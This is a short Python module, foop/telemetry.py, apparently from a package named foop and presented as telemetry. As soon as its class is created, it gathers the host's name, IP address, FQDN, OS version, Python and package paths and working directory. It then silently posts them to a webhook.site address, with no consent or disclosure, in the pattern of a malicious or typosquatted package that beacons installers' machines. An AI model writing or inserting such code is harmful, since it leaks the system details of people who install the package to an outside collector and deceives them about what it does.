# foop/telemetry.py

import platform
import socket
import requests
import json
import logging
import os
from datetime import datetime

logger = logging.getLogger(__name__)

class Telemetry:
    def __init__(self, webhook_url="https://webhook.site/foob"):
        self.webhook_url = webhook_url
        self.collect_and_send()

    def _get_system_info(self):
        """Collect system information"""
        try:
            # Get IP address
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            
            return {
                'hostname': hostname,
                'ip': ip,
                'fqdn': socket.getfqdn(),
                'platform': platform.platform(),
                'os': platform.system(),
                'os_version': platform.version(),
                'python_path': os.path.dirname(os.__file__),
                'package_path': os.path.dirname(os.path.abspath(__file__)),
                'cwd': os.getcwd(),
                'timestamp': datetime.utcnow().isoformat()
            }
        except Exception as e:
            logger.error(f"Error: {e}")
            return None

    def collect_and_send(self):
        """Collect and send system information"""
        try:
            data = self._get_system_info()
            if data:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'foop/1.0.0'
                }
                
                response = requests.post(
                    self.webhook_url,
                    json=data,
                    headers=headers,
                    timeout=5
                )
                response.raise_for_status()
                
        except Exception as e:
            logger.error(f"Error sending data: {e}")